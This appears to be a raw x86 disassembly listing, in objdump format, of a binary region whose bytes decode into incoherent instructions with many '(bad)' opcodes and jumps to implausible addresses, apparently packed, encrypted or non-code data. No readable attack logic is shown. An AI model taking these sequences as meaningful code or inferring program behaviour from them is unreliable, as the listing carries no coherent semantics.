  429a09:	call   0x1e83de7e
  429a0e:	scas   al,BYTE PTR es:[edi]
  429a0f:	shl    DWORD PTR [edx-0x44],0x1a
  429a13:	add    BYTE PTR [ebp-0x67],0xd2
  429a17:	cmp    al,0x2
  429a19:	cdq    
  429a1a:	es cmp eax,0x7d8dfd27
  429a20:	pop    ss
  429a21:	js     0x429a03
  429a23:	fstp   DWORD PTR [ecx]
  429a25:	add    esi,esp
  429a27:	adc    DWORD PTR [ecx-0x49c877fa],ebp
  429a2d:	aad    0xb
  429a2f:	stos   BYTE PTR es:[edi],al
  429a30:	loop   0x429a41
  429a32:	jns    0x4299bd
  429a34:	push   esi
	...
  429a95:	add    dh,cl
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0x22a75913
  429aa5:	adc    eax,DWORD PTR [ebp-0x43]
  429aa8:	add    DWORD PTR [eax],eax
  429aaa:	pop    es
  429aab:	add    DWORD PTR [eax],eax
  429aad:	add    BYTE PTR [esi+0x8],dh
  429ab0:	pop    ss
  429ab1:	(bad)  
  429ab2:	pop    ebx
  429ab3:	push   ebx
  429ab4:	mov    ebp,0x5285a3cb
  429ab9:	push   ecx
  429aba:	xor    ah,al
  429abc:	jnp    0x429ac7
  429abe:	repnz or BYTE PTR [ebx-0x3c1326f4],ch
  429ac5:	mov    ebx,0x5cf412d6
  429aca:	call   0x398d7471
  429acf:	loop   0x429ae9
  429ad1:	shl    BYTE PTR [edx],cl
  429ad3:	mov    BYTE PTR [esi-0x3dd514c],dh
  429ad9:	retf   
  429ada:	aaa    
  429adb:	mov    ah,0x12
  429add:	lea    ebx,[ebx-0x11]
  429ae0:	nop
  429ae1:	push   0x978815f7
  429ae6:	dec    esp
  429ae7:	mov    ch,0x1d
  429ae9:	pop    eax
  429aea:	inc    ebp
  429aeb:	jmp    0x7003c6c5
  429af0:	add    al,0xff
  429af2:	jp     0x429ac7
  429af4:	inc    esi
  429af5:	je     0x429acf
  429af7:	mov    bl,0xec
  429af9:	enter  0x9d47,0x99
  429afd:	not    BYTE PTR [esi-0x79]
  429b00:	push   ebx
  429b01:	push   ebp
  429b02:	mov    esp,edi
  429b04:	les    edx,FWORD PTR [ebp+0x575b4364]
  429b0a:	dec    ebx
  429b0b:	dec    ebp
  429b0c:	push   eax
  429b0d:	mov    DWORD PTR [esi-0x2c],edi
  429b10:	enter  0x3acf,0x7f
  429b14:	cmp    DWORD PTR [ecx+0x44b48a3d],esp
  429b1a:	cmp    DWORD PTR [edx+0x51],eax
  429b1d:	sahf   
  429b1e:	ins    BYTE PTR es:[edi],dx
  429b1f:	(bad)  
  429b20:	push   esi
  429b21:	cwde   
  429b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b23:	ins    BYTE PTR es:[edi],dx
  429b24:	imul   ebx,DWORD PTR [edi-0x5b90dad7],0x4e1d02c2
  429b2e:	sub    eax,0xc8d026a2
  429b33:	in     eax,dx
  429b34:	(bad)  
  429b35:	mov    ecx,0xefe3dc01
  429b3a:	mov    edi,0x2d01f879
  429b3f:	push   ds
  429b40:	pop    esp
  429b41:	lds    edx,FWORD PTR [eax-0x56]
  429b44:	out    dx,eax
  429b45:	popf   
  429b46:	ret    0x65b2
  429b49:	not    BYTE PTR [eax+0x41dbc7a]
  429b4f:	add    ebp,esi
  429b51:	retf   
  429b52:	push   esp
  429b53:	call   0x2fa3:0x3fa5f5e3
  429b5a:	out    0xec,eax
  429b5c:	jb     0x429b39
  429b5e:	mov    eax,ds:0x5070566a
  429b63:	xor    DWORD PTR [ecx-0x6381473a],edi
  429b69:	js     0x429b8c
  429b6b:	xchg   ecx,eax
  429b6c:	std    
  429b6d:	int3   
  429b6e:	adc    BYTE PTR [edx-0x3a],dh
  429b71:	push   es
  429b72:	or     cl,ah
  429b74:	scas   eax,DWORD PTR es:[edi]
  429b75:	in     al,dx
  429b76:	xchg   BYTE PTR [esi+0x48],cl
  429b79:	sub    BYTE PTR [ebx+0x26],0x54
  429b7d:	data16 clc 
  429b7f:	push   ds
  429b80:	and    DWORD PTR [esp+eiz*8],edx
  429b83:	fisub  DWORD PTR [ebp+0x60]
  429b86:	adc    DWORD PTR [edi+ebp*2],edx
  429b89:	dec    ebp
  429b8a:	lock and eax,0xd26627c3
  429b90:	pop    edi
  429b91:	xor    al,BYTE PTR [eax+ebx*2-0x73f8a88a]
  429b98:	fcom   st(7)
  429b9a:	ins    BYTE PTR es:[edi],dx
  429b9b:	fistp  QWORD PTR [ebx+0x7fdb4f62]
  429ba1:	jg     0x429bf0
  429ba3:	ins    DWORD PTR es:[edi],dx
  429ba4:	sub    BYTE PTR [edi-0xc0b5b0f],dl
  429baa:	ret    
  429bab:	test   BYTE PTR [edi-0x1e],0x42
  429baf:	fnstenv [ebx-0x547ba026]
	...
  429c15:	add    BYTE PTR [ebx-0x487759ea],ah
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	ds inc esp
  429c24:	shl    DWORD PTR [eax],0x4c
  429c27:	mov    esi,0x1070001
  429c2c:	add    BYTE PTR [eax],al
  429c2e:	or     DWORD PTR [ebp-0x23],edx
  429c31:	jb     0x429c18
  429c33:	push   eax
  429c34:	pop    esp
  429c35:	enter  0xc689,0x3f
  429c39:	div    DWORD PTR [ecx]
  429c3b:	daa    
  429c3c:	inc    edi
  429c3d:	aam    0x30
  429c3f:	out    0xbc,eax
  429c41:	or     ebx,0xffffffe2
  429c44:	xchg   BYTE PTR [ebx-0x5a9843b1],al
  429c4a:	test   BYTE PTR [edx],0x3d
  429c4d:	cdq    
  429c4e:	mov    dl,0x1b
  429c50:	and    edi,DWORD PTR [ecx+0x6c09770f]
  429c56:	mov    edi,0xb360148
  429c5b:	std    
  429c5c:	jne    0x429cb7
  429c5e:	retf   0x70fe
  429c61:	scas   al,BYTE PTR es:[edi]
  429c62:	jp     0x429c1f
  429c64:	sub    al,0x9c
  429c66:	lods   eax,DWORD PTR ds:[esi]
  429c67:	sbb    esp,edi
  429c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c6a:	push   eax
  429c6b:	sbb    ch,0x1c
  429c6e:	fldcw  WORD PTR [ecx]
  429c70:	sub    BYTE PTR [eax+0x10921459],ch
  429c76:	mov    edi,0x59467bb1
  429c7b:	mov    ebp,0xf9e034f2
  429c80:	cmc    
  429c81:	fst    QWORD PTR [ebx+eiz*1]
  429c84:	push   es
  429c85:	pusha  
  429c86:	mov    ds:0x8b0bfd64,al
  429c8b:	push   ecx
  429c8c:	push   ebp
  429c8d:	in     al,0x53
  429c8f:	(bad)  
  429c90:	hlt    
  429c91:	ret    
  429c92:	add    al,0xc6
  429c94:	or     cl,BYTE PTR [ebx+0x12d2ed76]
  429c9a:	data16 (bad) 
  429c9c:	lock jle 0x429cc0
  429c9f:	aam    0xa
  429ca1:	pusha  
  429ca2:	dec    edx
  429ca3:	ins    BYTE PTR es:[edi],dx
  429ca4:	mov    bl,0x74
  429ca6:	les    esp,FWORD PTR [esp+ebx*8+0x78]
  429caa:	and    al,0xb6
  429cac:	jo     0x429c3c
  429cae:	jge    0x429c56
  429cb0:	es mov edi,0xb527ea00
  429cb6:	xchg   edx,eax
  429cb7:	imul   edi,esi,0xfffffff7
  429cba:	adc    DWORD PTR [eax],ebx
  429cbc:	cmc    
  429cbd:	jp     0x429cef
  429cbf:	ffree  st(1)
  429cc1:	mov    ebp,0x2261ac28
  429cc6:	(bad)  
  429cc7:	jo     0x429d02
  429cc9:	sbb    esp,ebx
  429ccb:	xor    esp,esp
  429ccd:	sub    ecx,DWORD PTR [esi+0x2245f484]
  429cd3:	ins    BYTE PTR es:[edi],dx
  429cd4:	xor    al,0x58
  429cd6:	xchg   DWORD PTR [esp+eax*8],ebx
  429cd9:	and    BYTE PTR [edi],al
  429cdb:	and    al,ah
  429cdd:	ins    BYTE PTR es:[edi],dx
  429cde:	daa    
  429cdf:	mov    eax,ds:0x8f577ea6
  429ce4:	sub    DWORD PTR [esi-0x2c],0xffffffaf
  429ce8:	mov    gs,WORD PTR [edx]
  429cea:	jecxz  0x429cee
  429cec:	pusha  
  429ced:	retf   0xf665
  429cf0:	gs addr16 gs out 0x98,eax
  429cf5:	jno    0x429ccc
  429cf7:	xchg   edx,eax
  429cf8:	cmc    
  429cf9:	push   es
  429cfa:	ja     0x429c87
  429cfc:	mov    bl,BYTE PTR [esi]
  429cfe:	lods   eax,DWORD PTR ds:[esi]
  429cff:	or     BYTE PTR [esp+esi*1+0x43],bh
  429d03:	or     DWORD PTR [eax-0x27],ecx
  429d06:	data16 adc bh,0x41
  429d0a:	sbb    al,0xe2
  429d0c:	adc    al,0x96
  429d0e:	sub    DWORD PTR [esi],esp
  429d10:	hlt    
  429d11:	scas   al,BYTE PTR es:[edi]
  429d12:	jmp    0x2b04:0x9caa5b
  429d19:	std    
  429d1a:	cmp    BYTE PTR [edi-0x72085f3c],cl
  429d20:	shl    DWORD PTR [ecx+edx*8+0x6d],cl
  429d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d25:	stc    
  429d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d27:	lods   eax,DWORD PTR ds:[esi]
  429d28:	jle    0x429d77
  429d2a:	xchg   ecx,eax
  429d2b:	js     0x429d8d
  429d2d:	in     eax,dx
  429d2e:	retf   0xa99
  429d31:	jl     0x429d92
  429d33:	sar    DWORD PTR [edx+0x0],1
	...
  429d96:	fwait
  429d97:	mov    bh,0xc4
  429d99:	or     al,0xec
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0x47c10902
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	test   BYTE PTR [ecx+0x69],bl
  429db1:	jl     0x429de3
  429db3:	pop    esp
  429db4:	and    al,0x36
  429db6:	jno    0x429e1e
  429db8:	pop    ecx
  429db9:	aas    
  429dba:	adc    BYTE PTR [edx+0x69],0xd8
  429dbe:	lods   eax,DWORD PTR ds:[esi]
  429dbf:	mov    eax,0xa10b5737
  429dc4:	jmp    0xca3aa528
  429dc9:	lock or bh,BYTE PTR [esi-0x69ef294]
  429dd0:	ds ret 0xf71
  429dd4:	dec    esp
  429dd5:	jmp    0x429e4d
  429dd7:	retf   
  429dd8:	dec    ebp
  429dd9:	call   0x20b1:0xcc1c7b8d
  429de0:	mov    ebx,0xe46ee277
  429de5:	sti    
  429de6:	push   esp
  429de7:	ds pop esp
  429de9:	jae    0x429da1
  429deb:	(bad)  
  429dec:	(bad)  [edx]
  429dee:	and    al,0x8a
  429df0:	xor    ch,bh
  429df2:	fsub   DWORD PTR [esi-0x15]
  429df5:	retf   0xcabc
  429df8:	cs dec esi
  429dfa:	popf   
  429dfb:	adc    al,bh
  429dfd:	push   esp
  429dfe:	call   0x3ce2d8f6
  429e03:	(bad)  
  429e04:	shl    DWORD PTR [ebx+0xb9f7841],cl
  429e0a:	push   edx
  429e0b:	mov    edx,ebp
  429e0d:	cvtps2pd xmm0,QWORD PTR [ecx-0x3419d4eb]
  429e14:	push   esp
  429e15:	in     al,0xee
  429e17:	int3   
  429e18:	int3   
  429e19:	shr    DWORD PTR [ecx+0x57eaa5a3],cl
  429e1f:	(bad)  
  429e20:	gs push es
  429e22:	and    esp,edi
  429e24:	jbe    0x429de4
  429e26:	fs (bad) 
  429e28:	jnp    0x429e79
  429e2a:	and    al,0x21
  429e2c:	mov    ah,0x62
  429e2e:	add    eax,0x3824b09b
  429e33:	into   
  429e34:	stc    
  429e35:	xchg   edx,eax
  429e36:	xor    BYTE PTR [edi+0x69],bl
  429e39:	ss push 0x1dd9ef05
  429e3f:	mov    dh,0xe5
  429e41:	pop    ebx
  429e42:	fild   QWORD PTR [esi-0xe]
  429e45:	repnz adc DWORD PTR [ecx-0x69937fd3],eax
  429e4c:	cmp    dh,BYTE PTR [ebx-0x3a56b6cc]
  429e52:	ja     0x429e6a
  429e54:	shr    BYTE PTR [esi-0x13fcee73],cl
  429e5a:	xchg   DWORD PTR [ebx-0x6c3ee6f1],edx
  429e60:	add    ebx,ebp
  429e62:	inc    edi
  429e63:	div    BYTE PTR [ecx]
  429e65:	call   0x616ed14d
  429e6a:	setno  BYTE PTR [ebp+0x1ebc921f]
  429e71:	adc    al,0xa0
  429e73:	adc    DWORD PTR [ecx-0x19],ecx
  429e76:	stos   BYTE PTR es:[edi],al
  429e77:	cli    
  429e78:	dec    eax
  429e79:	ds pop eax
  429e7b:	xchg   ebp,eax
  429e7c:	pop    edx
  429e7d:	push   edi
  429e7e:	aas    
  429e7f:	sbb    esi,DWORD PTR [edx+edi*2+0x7e]
  429e83:	outs   dx,BYTE PTR ds:[esi]
  429e84:	xor    al,0x30
  429e86:	xchg   edx,eax
  429e87:	sbb    DWORD PTR [ebp-0x163674da],ecx
  429e8d:	lea    edi,[eax+0x4bd4c7ce]
  429e93:	push   ebx
  429e94:	sub    dh,0xb6
  429e97:	and    DWORD PTR [edx+0x4f],ebx
  429e9a:	pop    ebp
  429e9b:	in     eax,0x6f
  429e9d:	mov    al,BYTE PTR [edx+0x201d5feb]
  429ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ea4:	jge    0x429eb1
  429ea6:	(bad)  
  429ea7:	push   edx
  429ea8:	add    eax,0xcfcb2390
  429ead:	push   ebp
  429eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429eaf:	aas    
  429eb0:	cmp    al,0xc9
  429eb2:	sbb    ch,BYTE PTR [ebx]
  429eb4:	sub    al,0x0
	...
  429f16:	xor    DWORD PTR [ebp-0x38],eax
  429f19:	push   es
  429f1a:	cld    
  429f1b:	(bad)  
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0xcaca2c59
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    BYTE PTR [ecx-0x15],dl
  429f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429f31:	lock add eax,0x4c49f33e
  429f37:	xchg   DWORD PTR [eax-0x1540002e],esp
  429f3d:	ret    0x31c0
  429f40:	mov    edi,0xdf912930
  429f45:	add    bl,al
  429f47:	jmp    0x429f46
  429f49:	mov    ds:0xea9ce20e,eax
  429f4e:	cmp    eax,0x2ab081b2
  429f53:	cmp    ebx,DWORD PTR [esi]
  429f55:	cwde   
  429f56:	pop    edx
  429f57:	pushf  
  429f58:	mov    edx,DWORD PTR [edx+0x4a]
  429f5b:	add    DWORD PTR [esi-0x28],ecx
  429f5e:	call   0x699c250e
  429f63:	xchg   edi,eax
  429f64:	in     eax,0x7
  429f66:	pop    ss
  429f67:	sub    ah,BYTE PTR [esi+ebx*2]
  429f6a:	xchg   ebx,eax
  429f6b:	dec    ebx
  429f6c:	imul   ebp,DWORD PTR [esi-0x24],0x4fbe6cb9
  429f73:	add    eax,0x6284bdbf
  429f78:	ss ret 0xa83e
  429f7c:	mov    eax,ds:0x8852c968
  429f81:	popf   
  429f82:	jnp    0x429f8a
  429f84:	ins    DWORD PTR es:[edi],dx
  429f85:	loopne 0x429f40
  429f87:	jecxz  0x429fee
  429f89:	fcmovnbe st,st(2)
  429f8b:	(bad)  
  429f8c:	xlat   BYTE PTR ds:[ebx]
  429f8d:	loop   0x429fac
  429f8f:	(bad)  
  429f90:	adc    al,0x6e
  429f92:	jge    0x429f97
  429f94:	pop    es
  429f95:	test   DWORD PTR [edx+0x1d],ebp
  429f98:	mov    al,ds:0xd02bd15d
  429f9d:	mov    esi,DWORD PTR [edi-0x29]
  429fa0:	push   cs
  429fa1:	(bad)  
  429fa2:	mov    ch,0x50
  429fa4:	(bad)
  429fa7:	mov    esp,ebp
  429fa9:	les    ecx,FWORD PTR [esi+0x4c7a0a51]
  429faf:	adc    ebx,DWORD PTR [eax-0x10ca0409]
  429fb5:	clc    
  429fb6:	ret    0x428e
  429fb9:	xchg   bl,bh
  429fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429fbc:	push   eax
  429fbd:	repz inc ebp
  429fbf:	adc    ecx,edi
  429fc1:	enter  0xc9de,0x96
  429fc5:	mov    bh,0xf7
  429fc7:	ss pop ecx
  429fc9:	fs out dx,eax
  429fcb:	iret   
  429fcc:	ds scas al,BYTE PTR es:[edi]
  429fce:	cwde   
  429fcf:	imul   eax,edx,0xffffffa8
  429fd2:	xor    esp,esp
  429fd4:	dec    edi
  429fd5:	aam    0xcb
  429fd7:	cli    
  429fd8:	add    eax,0x1a718dd5
  429fdd:	sbb    esi,esi
  429fdf:	push   0xfffffffe
  429fe1:	ss pop ebp
  429fe3:	outs   dx,DWORD PTR ds:[esi]
  429fe4:	and    al,ah
  429fe6:	sub    DWORD PTR [ecx],ecx
  429fe8:	pusha  
  429fe9:	dec    ebp
  429fea:	dec    ebp
  429feb:	add    DWORD PTR [esi+0x48],esi
  429fee:	fcom   DWORD PTR [esi+0x4d757efb]
  429ff4:	fucomp st(7)
  429ff6:	add    ecx,esi
  429ff8:	jp     0x429fba
  429ffa:	(bad)  
  429ffc:	call   DWORD PTR [esi+eiz*2+0x3a1aa4e2]
  42a003:	aad    0x7b
  42a005:	call   0x672a016a
  42a00a:	pop    es
  42a00b:	pop    ecx
  42a00c:	nop
  42a00d:	(bad)  
  42a00e:	adc    DWORD PTR [edx],esi
  42a010:	(bad)  
  42a011:	fs mov ebp,0x3062f9b0
  42a017:	mov    ds:0xa095ffcc,eax
  42a01c:	xor    BYTE PTR [ecx+esi*4],bl
  42a01f:	inc    ebp
  42a020:	(bad)  
  42a021:	imul   eax
  42a023:	jg     0x42a07d
  42a025:	jmp    0xaeffa90e
  42a02a:	or     esi,DWORD PTR es:[ecx+edi*4+0x53]
  42a02f:	outs   dx,BYTE PTR ds:[esi]
  42a030:	sbb    ecx,DWORD PTR [edx]
  42a032:	lahf   
  42a033:	dec    ebx
  42a034:	sbb    BYTE PTR [eax],al
	...
  42a096:	xlat   BYTE PTR ds:[ebx]
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0xb365494e
  42a0a5:	lods   al,BYTE PTR ds:[esi]
  42a0a6:	popa   
  42a0a7:	rol    DWORD PTR [ecx],0x0
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    BYTE PTR [ebx+0x6f34b828],dh
  42a0b3:	sbb    DWORD PTR [edx-0xb0e1985],eax
  42a0b9:	pop    esp
  42a0ba:	test   BYTE PTR [ecx+ebx*1],dh
  42a0bd:	mov    esi,0x38ded07d
  42a0c2:	leave  
  42a0c3:	xchg   ebx,eax
  42a0c4:	or     DWORD PTR [ecx+0x5d5ab2cb],esi
  42a0ca:	int3   
  42a0cb:	and    ebx,esp
  42a0cd:	mov    al,BYTE PTR [edi-0x53]
  42a0d0:	pushf  
  42a0d1:	or     dl,BYTE PTR [edx-0x7f]
  42a0d4:	imul   eax,DWORD PTR [eax+0x35],0x21a754a9
  42a0db:	test   edx,esp
  42a0dd:	(bad)  
  42a0de:	scas   eax,DWORD PTR es:[edi]
  42a0df:	ror    DWORD PTR [ecx+ebx*1+0x8],0xe2
  42a0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a0e5:	jmp    0x4dc6:0x15dd870e
  42a0ec:	gs sub eax,0x744bca8e
  42a0f2:	mov    cl,0xe7
  42a0f4:	mov    ds:0xc8a957f0,eax
  42a0f9:	jno    0x42a0c8
  42a0fb:	dec    esi
  42a0fc:	pop    eax
  42a0fd:	xchg   DWORD PTR [edx+0xb98ab92],ebp
  42a103:	imul   esp,esi,0xffffffcd
  42a106:	xor    al,0x90
  42a108:	dec    eax
  42a109:	sub    BYTE PTR [ebx+0x1125dcf5],cl
  42a10f:	es add al,0xc2
  42a112:	fnstcw WORD PTR [ecx+0x31]
  42a115:	hlt    
  42a116:	mov    DWORD PTR [ecx],edi
  42a118:	jns    0x42a118
  42a11a:	sub    al,BYTE PTR ds:0x298e116f
  42a120:	adc    DWORD PTR [ebx],ebp
  42a122:	dec    edi
  42a123:	mov    dh,0x7
  42a125:	adc    ebp,eax
  42a127:	out    0x47,al
  42a129:	fld    TBYTE PTR ds:0xba05f39d
  42a12f:	jg     0x42a0ca
  42a131:	shl    BYTE PTR [ebp+0x7c],1
  42a134:	outs   dx,BYTE PTR ds:[esi]
  42a135:	pop    esp
  42a136:	mov    eax,ds:0x62023f5e
  42a13b:	cmp    al,0x3d
  42a13d:	pop    ebp
  42a13e:	jns    0x42a117
  42a140:	(bad)  
  42a141:	in     eax,dx
  42a142:	mov    dh,0x34
  42a144:	int3   
  42a145:	ds scas eax,DWORD PTR es:[edi]
  42a147:	sti    
  42a148:	and    ah,al
  42a14a:	jb     0x42a0e7
  42a14c:	jo     0x42a138
  42a14e:	mov    ah,0xfc
  42a150:	pop    edx
  42a151:	jp     0x42a1bf
  42a153:	(bad)  
  42a155:	jb     0x42a0e7
  42a157:	jge    0x42a1bb
  42a159:	shl    DWORD PTR [eax-0x35c9a79f],1
  42a15f:	cmp    ch,cl
  42a161:	xchg   ebx,eax
  42a162:	pop    ebp
  42a163:	xchg   ecx,eax
  42a164:	dec    ebp
  42a165:	jbe    0x42a10e
  42a167:	bound  ebx,QWORD PTR [edx-0x6a436ede]
  42a16d:	push   ebx
  42a16e:	mov    bl,0x9f
  42a170:	mov    edx,0x5d93ef20
  42a175:	test   BYTE PTR [eax+eax*4-0x15],bl
  42a179:	jnp    0x42a163
  42a17b:	nop
  42a17c:	jle    0x42a1b2
  42a17e:	imul   esi,DWORD PTR [edi],0xd03aee5b
  42a184:	or     eax,0x8e78216e
  42a189:	cdq    
  42a18a:	mov    BYTE PTR [edx+0x2f],bl
  42a18d:	lods   eax,DWORD PTR ds:[esi]
  42a18e:	enter  0x8508,0xe0
  42a192:	pop    ecx
  42a193:	mov    ds:0x61c4a1e3,al
  42a198:	lahf   
  42a199:	push   0x38
  42a19b:	pop    eax
  42a19c:	or     esp,DWORD PTR [edx-0x42ddbc6b]
  42a1a2:	or     DWORD PTR [ebx+0x32],ecx
  42a1a5:	and    esi,ecx
  42a1a7:	adc    ebp,DWORD PTR [ebx]
  42a1a9:	stc    
  42a1aa:	test   al,0xe4
  42a1ac:	fist   DWORD PTR [edx+0x62]
  42a1af:	pop    edi
  42a1b0:	pop    eax
  42a1b1:	(bad)
	...
  42a215:	add    BYTE PTR [ebx],ch
  42a217:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   edi,ecx,0x68e47d9e
  42a227:	ret    0x1
  42a22a:	pop    es
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    BYTE PTR [ebx],bh
  42a22f:	pop    esp
  42a230:	cdq    
  42a231:	ja     0x42a2a9
  42a233:	xlat   BYTE PTR ds:[ebx]
  42a234:	xchg   BYTE PTR [ebx],ah
  42a236:	stos   DWORD PTR es:[edi],eax
  42a237:	xchg   BYTE PTR [esi-0x5],dh
  42a23a:	inc    eax
  42a23b:	sub    eax,0x9b1fb804
  42a240:	inc    esp
  42a241:	inc    ecx
  42a242:	sbb    ch,dh
  42a244:	lods   eax,DWORD PTR ds:[esi]
  42a245:	jbe    0x42a217
  42a247:	(bad)  [eax+0x49]
  42a24a:	adc    DWORD PTR [edx-0x4],ebp
  42a24d:	xchg   esi,eax
  42a24e:	inc    eax
  42a24f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a250:	ja     0x42a285
  42a252:	xor    edx,DWORD PTR [edx]
  42a254:	mov    ds:0xc96e35bf,al
  42a259:	push   ds
  42a25a:	add    BYTE PTR [edx-0x2a],cl
  42a25d:	dec    edi
  42a25e:	sub    eax,0xad336132
  42a263:	rol    esp,0x53
  42a266:	imul   esi,DWORD PTR [eax-0x3e53183e],0xffffffd9
  42a26d:	or     esi,DWORD PTR [edi+0x35]
  42a270:	stos   BYTE PTR es:[edi],al
  42a271:	dec    edx
  42a272:	in     eax,0x55
  42a274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a275:	lods   eax,DWORD PTR ds:[esi]
  42a276:	or     BYTE PTR [edx-0x581a528d],0x96
  42a27d:	clc    
  42a27e:	push   ebx
  42a27f:	retf   0xe80f
  42a282:	int3   
  42a283:	push   ecx
  42a285:	add    DWORD PTR [ebp+0x6787d968],ebx
  42a28b:	push   ebx
  42a28c:	push   ss
  42a28d:	ret    
  42a28e:	add    DWORD PTR [ebx],0xfffffff1
  42a291:	pop    eax
  42a292:	nop
  42a293:	or     DWORD PTR [ecx+eiz*4-0x20],edx
  42a297:	adc    esi,0x7e
  42a29a:	or     al,0x8f
  42a29c:	(bad)  
  42a29d:	mov    al,0xa9
  42a29f:	neg    DWORD PTR [ebp-0x25c7ac59]
  42a2a5:	and    eax,0xf67e7db1
  42a2aa:	in     eax,0x88
  42a2ac:	inc    ebx
  42a2ad:	jp     0x42a326
  42a2af:	imul   edx,DWORD PTR [esi+0x5f],0x8480ba36
  42a2b6:	or     bl,BYTE PTR [ecx+ecx*2+0x77dca6c4]
  42a2bd:	jp     0x42a2f2
  42a2bf:	sbb    ah,cl
  42a2c1:	adc    ebx,edi
  42a2c3:	enter  0x8d7e,0x81
  42a2c7:	pop    edx
  42a2c8:	fcomp  QWORD PTR [esi]
  42a2ca:	mov    ch,0x56
  42a2cc:	js     0x42a32d
  42a2ce:	mov    DWORD PTR [eax-0x2683e399],0x3b06d976
  42a2d8:	aaa    
  42a2d9:	dec    ecx
  42a2da:	and    BYTE PTR [eax-0x6d],bl
  42a2dd:	inc    ebx
  42a2de:	and    BYTE PTR [edx],0x1a
  42a2e1:	mov    edx,DWORD PTR [eax-0x3d87316b]
  42a2e7:	jmp    0x76e8:0xf165c0fd
  42a2ee:	inc    esi
  42a2ef:	rcl    BYTE PTR [ebx],1
  42a2f1:	stos   BYTE PTR es:[edi],al
  42a2f2:	leave  
  42a2f3:	inc    ecx
  42a2f4:	or     bh,bl
  42a2f6:	xchg   esi,eax
  42a2f7:	sar    DWORD PTR [edx-0x43aaddd9],cl
  42a2fd:	xor    BYTE PTR [ecx],bh
  42a2ff:	jns    0x42a2c1
  42a301:	ret    
  42a302:	(bad)  
  42a303:	mov    edx,0xae6ae30e
  42a308:	pmullw mm0,QWORD PTR [ebp+0x66]
  42a30c:	sbb    eax,0x2122351e
  42a311:	lea    edx,[ebp-0x7d]
  42a314:	sbb    bl,BYTE PTR [esi+0x74]
  42a317:	lods   al,BYTE PTR ds:[esi]
  42a318:	jecxz  0x42a2e9
  42a31a:	test   BYTE PTR [edx+eax*1-0x4e],ah
  42a31e:	inc    eax
  42a31f:	or     al,0x8
  42a321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a322:	mov    edi,0x10df2c16
  42a327:	xchg   edi,eax
  42a328:	cwde   
  42a329:	adc    dh,ah
  42a32b:	jo     0x42a2d9
  42a32d:	inc    esi
  42a32e:	sbb    DWORD PTR [edx+0x7be38b64],esi
  42a334:	add    BYTE PTR [eax],0x0
	...
  42a393:	add    BYTE PTR [eax],al
  42a395:	add    BYTE PTR [edi+0xe],bh
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0xe6b1
  42a3a4:	test   edx,ebx
  42a3a6:	outs   dx,DWORD PTR ds:[esi]
  42a3a7:	ret    
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [edi],ch
  42a3af:	xchg   esi,eax
  42a3b0:	dec    edx
  42a3b1:	push   ebx
  42a3b2:	jecxz  0x42a38f
  42a3b4:	inc    ebp
  42a3b5:	mov    esp,0xb3898ba1
  42a3ba:	lods   al,BYTE PTR ds:[esi]
  42a3bb:	icebp  
  42a3bc:	bound  esi,QWORD PTR [ecx+0x25]
  42a3bf:	sub    DWORD PTR [eax+0x64c5994d],ecx
  42a3c5:	cmp    al,0xe2
  42a3c7:	mov    eax,0x2130e4c9
  42a3cc:	push   es
  42a3cd:	imul   bh
  42a3cf:	or     BYTE PTR [eax+0xb],0xba
  42a3d3:	xlat   BYTE PTR ds:[ebx]
  42a3d4:	pop    edx
  42a3d5:	mov    eax,0xc1bdd329
  42a3da:	sbb    al,0xed
  42a3dc:	aaa    
  42a3dd:	push   ss
  42a3de:	inc    ebp
  42a3df:	and    ebx,DWORD PTR [edi+0x6a]
  42a3e2:	in     eax,0x87
  42a3e4:	nop
  42a3e5:	sbb    al,0xd1
  42a3e7:	mov    ds:0xd61ab968,eax
  42a3ec:	test   BYTE PTR [ecx-0x4cefdc39],ah
  42a3f2:	adc    ebp,ebp
  42a3f4:	rcr    DWORD PTR [edx+0x561525d7],1
  42a3fa:	cmp    al,0x11
  42a3fc:	jecxz  0x42a3c8
  42a3fe:	fcmovbe st,st(2)
  42a400:	mov    ds:0x67d9e7a2,al
  42a405:	xor    ebx,esi
  42a407:	fild   DWORD PTR [esi]
  42a409:	mov    eax,0x7d4d7af1
  42a40e:	push   ecx
  42a40f:	sbb    al,0x9e
  42a411:	stos   DWORD PTR es:[edi],eax
  42a412:	dec    edx
  42a413:	mov    ds:0xa45d7baa,al
